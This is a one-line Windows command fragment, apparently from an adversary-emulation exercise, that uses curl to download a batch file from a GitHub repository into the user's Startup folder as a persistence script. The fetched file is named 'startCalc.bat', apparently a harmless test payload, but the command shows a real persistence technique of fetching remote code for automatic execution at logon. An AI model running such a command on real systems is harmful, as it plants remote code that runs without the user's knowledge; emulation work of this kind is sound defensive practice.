...
curl.exe -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat" "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat"
